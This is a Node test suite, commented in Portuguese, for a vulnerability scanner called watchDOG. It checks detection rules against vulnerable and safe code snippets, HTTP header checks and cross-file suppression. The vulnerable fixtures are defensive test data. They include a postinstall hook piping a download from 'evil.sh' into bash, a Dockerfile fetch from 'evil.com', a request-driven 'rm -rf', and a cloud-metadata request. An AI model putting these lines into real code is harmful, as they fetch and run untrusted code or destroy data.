'use strict';
// Suíte de testes do watchDOG — runner nativo do Node (node:test), sem dependências externas.
// Roda contra o build em dist/. Execute via: npm run test --workspace=scanner
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { allFileRules, allHttpRules } = require('../dist/rules/index.js');
const { analyzeLocalProject } = require('../dist/index.js');

function ruleById(id) {
  const r = allFileRules.find(x => x.id === id);
  assert.ok(r, `regra ${id} não encontrada em allFileRules`);
  return r;
}
function httpRuleById(id) {
  const r = allHttpRules.find(x => x.id === id);
  assert.ok(r, `HttpRule ${id} não encontrada`);
  return r;
}
// Testa um snippet contra os patterns de uma regra usando clones sem estado (evita lastIndex global).
function matchesRule(id, snippet) {
  const r = ruleById(id);
  return r.patterns.some(p => new RegExp(p.source, p.flags.replace('g', '')).test(snippet));
}

// ---------------------------------------------------------------------------
test('integridade: sem IDs duplicados em allFileRules', () => {
  const ids = allFileRules.map(r => r.id);
  const dup = [...new Set(ids.filter((id, i) => ids.indexOf(id) !== i))];
  assert.deepEqual(dup, [], `IDs duplicados: ${dup.join(', ')}`);
});

test('integridade: todos os campos obrigatórios e patterns válidos', () => {
  const sev = new Set(['critical', 'high', 'medium', 'low', 'info']);
  for (const r of allFileRules) {
    assert.ok(r.id && r.title && r.category, `campos base faltando em ${r.id}`);
    assert.ok(sev.has(r.severity), `severity inválida em ${r.id}: ${r.severity}`);
    assert.ok(r.description && r.impact && r.remediation, `texto faltando em ${r.id}`);
    assert.ok(Array.isArray(r.patterns), `patterns não é array em ${r.id}`);
    for (const p of r.patterns) assert.ok(p instanceof RegExp, `pattern não-RegExp em ${r.id}`);
    if (r.fileExtensions) for (const e of r.fileExtensions) assert.ok(e.startsWith('.'), `ext sem ponto em ${r.id}: ${e}`);
  }
});

test('integridade: HttpRules têm check() função', () => {
  for (const r of allHttpRules) assert.equal(typeof r.check, 'function', `check inválido em ${r.id}`);
  assert.ok(allFileRules.length >= 200, `esperava >=200 FileRules, tem ${allFileRules.length}`);
  assert.ok(allHttpRules.length >= 20, `esperava >=20 HttpRules, tem ${allHttpRules.length}`);
});

// ---------------------------------------------------------------------------
// Casamento POSITIVO (código vulnerável deve disparar)
const positivos = [
  ['INJ_001', 'exec(`rm -rf ${req.body.path}`)'],
  ['INJ_002', 'subprocess.run(cmd, shell=True)'],
  ['INJ_006', 'User.find(req.body)'],
  ['INJ_009', "const s = require('node-serialize'); s.unserialize(data)"],
  ['INJ_015', 'setTimeout(`doWork(${req.query.n})`, 100)'],
  ['RED_001', 'res.redirect(req.query.next)'],
  ['SSRF_001', 'axios.get(req.body.url)'],
  ['JWT_002', "jwt.verify(t, k, { algorithms: ['none'] })"],
  ['JWT_003', 'const p = jwt.decode(token)'],
  ['JWT_006', 'jwt.verify(t, k, { ignoreExpiration: true })'],
  ['SECRET_013', 'const k = "AKIAIOSFODNN7EXAMPLE"'],
  ['SECRET_020', '-----BEGIN RSA PRIVATE KEY-----'],
  ['DOS_014', 'const re = new RegExp(req.query.term)'],
  ['DOS_007', 'repo.find({ take: req.query.limit })'],
  ['MASS_001', 'await User.create({ data: req.body })'],
  ['LLM_004', 'new OpenAI({ dangerouslyAllowBrowser: true })'],
  ['K8S_001', 'securityContext:\n  privileged: true'],
  ['K8S_002', 'spec:\n  hostNetwork: true'],
  ['DOCKER_010', 'USER root'],
  ['DOCKER_012', 'ADD https://evil.com/x.sh /tmp/x.sh'],
  ['IAC_001', 'acl = "public-read"'],
  ['SUPPLY_001', '"postinstall": "curl https://evil.sh | bash"'],
  ['CICD_011', 'run: echo ${{ github.event.issue.title }}'],
  ['WEB3_013', 'selfdestruct(payable(owner));'],
  // Cadeia de ataque do vídeo "Hackeei uma IA"
  ['WHOOK_002', 'if (req.body.status === "approved") { ativarPro(req.body.email); }'],
  ['WHOOK_003', 'const u = await db.user.findFirst({ where: { email: req.body.email } })'],
  ['WHOOK_004', 'const cacto = init("cacto"); const kirvano = init("kirvano");'],
  ['WHOOK_006', 'if (signature === req.headers["x-signature"]) process(evt)'],
  ['CLIENT_001', 'const isPremium = localStorage.getItem("isPremium")'],
  ['CLIENT_002', '<div className="options blur-sm premium">{sugestoes}</div>'],
  ['CLIENT_003', 'return isPremium ? fullData : null'],
  ['LLM_007', 'const system = `Você é um agente. Sua chave: sk-abc1234567890abcdef1234`'],
  ['LLM_008', 'const messages=[{role:"system",content:`Analise: ${imageText}`}]'],
  // Hardening 2026: cripto, sessao, SSRF, framework
  ['CRYPTO_001', 'const hash = createHash("md5").update(password).digest("hex")'],
  ['CRYPTO_002', 'const token = Math.random().toString(36).substring(2)'],
  ['CRYPTO_003', 'const c = createCipheriv("aes-256-ecb", key, null)'],
  ['CRYPTO_005', 'await db.user.create({ data: { password: req.body.password } })'],
  ['CRYPTO_006', 'const hash = await bcrypt.hash(senha, 8)'],
  ['CRYPTO_007', 'const agent = new https.Agent({ rejectUnauthorized: false })'],
  ['SESS_001', 'app.use(session({ secret: "keyboard-cat", resave: false }))'],
  ['SESS_003', 'app.use(session({ secret: process.env.S, resave: false, saveUninitialized: false }))'],
  ['SESS_005', 'const resetToken = Date.now().toString(36)'],
  ['SSRF_002', 'const meta = await fetch("http://169.254.169.254/latest/meta-data/")'],
  ['SSRF_004', 'const webhookUrl = req.body.webhookUrl'],
  ['SSRF_005', 'await page.goto(req.query.url)'],
  ['FRAME_002', 'if (headers["x-middleware-subrequest"]) skipAuth()'],
  ['FRAME_003', "app.set('trust proxy', true)"],
  ['FRAME_005', 'VITE_STRIPE_SECRET_KEY=sk_live_abc'],
  ['XSS_101', 'window.addEventListener("message", (e) => { render(e.data); })'],
  ['XSS_102', 'el.innerHTML = location.hash.slice(1)'],
  ['INJ_102', 'await sendMail({ to: req.body.to, subject: "oi" })'],
  ['GQL_001', 'const server = new ApolloServer({ schema })'],
];
for (const [id, snippet] of positivos) {
  test(`positivo: ${id} dispara em código vulnerável`, () => {
    assert.ok(matchesRule(id, snippet), `${id} NÃO casou: ${snippet}`);
  });
}

// Casamento NEGATIVO (código seguro NÃO deve disparar)
const negativos = [
  ['INJ_001', "execFile('git', ['clone', repoUrl])"],
  ['SSRF_001', 'axios.get("https://api.fixo.com/health")'],
  ['JWT_003', 'jwt.verify(token, secret, { algorithms: ["HS256"] })'],
  ['DOS_014', 'const re = /^[a-z]+$/'],
  ['RED_001', 'res.redirect("/dashboard")'],
  ['DOCKER_010', 'USER node'],
  ['IAC_001', 'acl = "private"'],
  ['CLIENT_001', 'const theme = localStorage.getItem("theme")'],
  ['WHOOK_002', 'if (status === "loading") return spinner'],
  ['CRYPTO_002', 'const token = crypto.randomBytes(32).toString("hex")'],
  ['CRYPTO_006', 'const hash = await bcrypt.hash(senha, 12)'],
  ['CRYPTO_007', 'const agent = new https.Agent({ rejectUnauthorized: true })'],
  ['FRAME_003', "app.set('trust proxy', 1)"],
  ['CRYPTO_001', 'const etag = createHash("md5").update(fileBuffer).digest("hex")'],
];
for (const [id, snippet] of negativos) {
  test(`negativo: ${id} NÃO dispara em código seguro`, () => {
    assert.ok(!matchesRule(id, snippet), `${id} casou indevidamente (falso-positivo): ${snippet}`);
  });
}

// ---------------------------------------------------------------------------
// HttpRules: cookies, CSP, WAF/CDN
test('HttpRule COOKIE_001: dispara em Set-Cookie sem HttpOnly', () => {
  const r = httpRuleById('COOKIE_001');
  assert.equal(r.check({ 'set-cookie': 'session=abc; Path=/; Secure' }), true);
  assert.equal(r.check({ 'set-cookie': 'session=abc; HttpOnly; Secure' }), false);
});
test('HttpRule DOSH_002: detecta WAF/CDN via cf-ray (Cloudflare)', () => {
  const r = httpRuleById('DOSH_002');
  assert.equal(r.check({ 'cf-ray': '8a1b2c3d4e5f-GRU' }), true);
  assert.equal(r.check({ server: 'nginx' }), false);
});

// ---------------------------------------------------------------------------
// Supressão cross-file (gate de postura DoS) — ponta a ponta no analyzer
function mkProject(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wd-test-'));
  for (const [name, content] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), content, 'utf8');
  }
  return dir;
}
async function scanIds(dir) {
  const res = await analyzeLocalProject({ projectPath: dir, scanId: 't', onEvent: () => {} });
  return new Set(res.findings.map(f => f.ruleId));
}

test('cross-file: DOS_001 dispara em Express SEM rate limiting', async () => {
  const dir = mkProject({ 'server.js': "const express=require('express');\nconst app=express();\napp.listen(3000);" });
  const ids = await scanIds(dir);
  assert.ok(ids.has('DOS_001'), 'DOS_001 deveria disparar sem rate limit');
});

test('cross-file: DOS_001 é suprimida quando há rate limiting no projeto', async () => {
  const dir = mkProject({
    'server.js': "const express=require('express');\nconst app=express();\napp.listen(3000);",
    'mw.js': "const rateLimit=require('express-rate-limit');\nmodule.exports=rateLimit({windowMs:60000,max:100});",
  });
  const ids = await scanIds(dir);
  assert.ok(!ids.has('DOS_001'), 'DOS_001 deveria ser suprimida (rate limiter presente)');
});

test('cross-file: DOS_004 suprimida quando há timeouts de servidor', async () => {
  const semTimeout = await scanIds(mkProject({ 'a.js': 'const s=http.createServer(app);\ns.listen(80);' }));
  assert.ok(semTimeout.has('DOS_004'), 'DOS_004 deveria disparar sem timeouts');
  const comTimeout = await scanIds(mkProject({ 'a.js': 'const s=http.createServer(app);\ns.requestTimeout=30000;\ns.listen(80);' }));
  assert.ok(!comTimeout.has('DOS_004'), 'DOS_004 deveria ser suprimida com requestTimeout');
});

// Bypass de pagamento via webhook (o ataque central do vídeo).
test('cross-file: WHOOK_001 dispara em webhook de pagamento SEM verificação de assinatura', async () => {
  const dir = mkProject({
    'webhook.js': "app.post('/api/webhook/kirvano', (req, res) => {\n  if (req.body.status === 'approved') ativarPro(req.body.email);\n  res.sendStatus(200);\n});",
  });
  const ids = await scanIds(dir);
  assert.ok(ids.has('WHOOK_001'), 'WHOOK_001 deveria disparar em webhook sem verificação de assinatura');
});

test('cross-file: WHOOK_001 suprimida quando o projeto verifica assinatura do webhook', async () => {
  const dir = mkProject({
    'webhook.js': "app.post('/api/webhook/stripe', (req, res) => {\n  const event = stripe.webhooks.constructEvent(req.rawBody, req.headers['stripe-signature'], process.env.STRIPE_WEBHOOK_SECRET);\n  if (event.type === 'checkout.session.completed') ativarPro(event.data.object.customer);\n  res.sendStatus(200);\n});",
  });
  const ids = await scanIds(dir);
  assert.ok(!ids.has('WHOOK_001'), 'WHOOK_001 deveria ser suprimida quando há constructEvent/verificação de assinatura');
});

// ---------------------------------------------------------------------------
// Upgrade set/2026: regras poliglotas, novas HttpRules e scanner de libs JS
const { scanJsLibraries } = require('../dist/analyzers/jsLibScanner.js');

const positivos2026 = [
  ['POLY_001', 'cmd := exec.Command("sh", "-c", userInput)'],
  ['POLY_001', 'exec.Command(fmt.Sprintf("ping %s", host))'],
  ['POLY_002', 'data.Body = template.HTML(userInput)'],
  ['POLY_003', 'db.Query(fmt.Sprintf("SELECT * FROM u WHERE id=%s", id))'],
  ['POLY_003', 'stmt.executeQuery("SELECT * FROM users WHERE name = \'" + name)'],
  ['POLY_004', "include $_GET['page'];"],
  ['POLY_005', 'extract($_REQUEST);'],
  ['POLY_006', 'mysqli_query($c, "SELECT * FROM t WHERE id=" . $_GET["id"]);'],
  ['POLY_007', 'obj.send(params[:method])'],
  ['POLY_008', 'YAML.load(params[:data])'],
  ['POLY_009', 'const out = path.join(dest, entry.fileName);'],
  ['POLY_010', 'const f = { filter: `(uid=${username})` }; // ldap'],
  ['POLY_012', 'ObjectInputStream ois = new ObjectInputStream(request.getInputStream());'],
];
for (const [id, code] of positivos2026) {
  test(`positivo: ${id} dispara em código vulnerável`, () => {
    assert.ok(matchesRule(id, code), `${id} deveria casar: ${code}`);
  });
}

const negativos2026 = [
  ['POLY_001', 'cmd := exec.Command("convert", inputPath, outputPath)'],
  ['POLY_003', 'db.Query("SELECT * FROM users WHERE id = $1", id)'],
  ['POLY_004', "include 'header.php';"],
  ['POLY_007', 'obj.send(:approve!)'],
  ['POLY_008', 'YAML.safe_load(params[:data])'],
];
for (const [id, code] of negativos2026) {
  test(`negativo: ${id} NÃO dispara em código seguro`, () => {
    assert.ok(!matchesRule(id, code), `${id} não deveria casar: ${code}`);
  });
}

test('HttpRule COOKIE_004: sessão sem prefixo __Host- dispara; com prefixo não', () => {
  const r = httpRuleById('COOKIE_004');
  assert.ok(r.check({ 'set-cookie': 'session=abc; Secure; HttpOnly; Path=/' }));
  assert.ok(!r.check({ 'set-cookie': '__Host-session=abc; Secure; HttpOnly; Path=/' }));
  assert.ok(!r.check({ 'set-cookie': 'theme=dark; Path=/' }), 'cookie não-sessão ignorado');
});

test('HttpRule HEAD_CSP_002: CSP sem frame-ancestors dispara; completa não', () => {
  const r = httpRuleById('HEAD_CSP_002');
  assert.ok(r.check({ 'content-security-policy': "default-src 'self'; script-src 'self'" }));
  assert.ok(!r.check({ 'content-security-policy': "default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'" }));
  assert.ok(!r.check({}), 'sem CSP não dispara (coberto por HEAD_002)');
});

test('HttpRule HEAD_010: CSP sem report-to/Reporting-Endpoints dispara', () => {
  const r = httpRuleById('HEAD_010');
  assert.ok(r.check({ 'content-security-policy': "default-src 'self'; report-uri /csp" }));
  assert.ok(!r.check({ 'content-security-policy': "default-src 'self'; report-to csp", 'reporting-endpoints': 'csp="https://x/csp"' }));
});

test('HttpRule HEAD_011: X-XSS-Protection 1 dispara; 0 não', () => {
  const r = httpRuleById('HEAD_011');
  assert.ok(r.check({ 'x-xss-protection': '1; mode=block' }));
  assert.ok(!r.check({ 'x-xss-protection': '0' }));
  assert.ok(!r.check({}));
});

test('jsLibScanner: detecta jQuery 1.12.4 e AngularJS EOL; ignora jQuery 3.7.1', () => {
  const hits = scanJsLibraries('/*! jQuery JavaScript Library v1.12.4 */ ... <script src="/vendor/angular-1.7.9.min.js"></script>');
  const libs = hits.map(h => `${h.library}@${h.version}:${h.vuln}`);
  assert.ok(libs.includes('jQuery@1.12.4:cve'), libs.join(','));
  assert.ok(libs.includes('AngularJS@1.7.9:eol'), libs.join(','));
  const clean = scanJsLibraries('/*! jQuery JavaScript Library v3.7.1 */ lodash-4.17.21.min.js');
  assert.equal(clean.length, 0, 'versões corrigidas não devem disparar');
});

test('integridade: referências OWASP migradas para Top 10 2025 (nenhum A0x:2021 restante)', () => {
  const stale = allFileRules.filter(r => /A\d\d:2021/.test(r.reference || ''));
  assert.deepEqual(stale.map(r => r.id), [], 'regras ainda referenciando OWASP 2021');
});
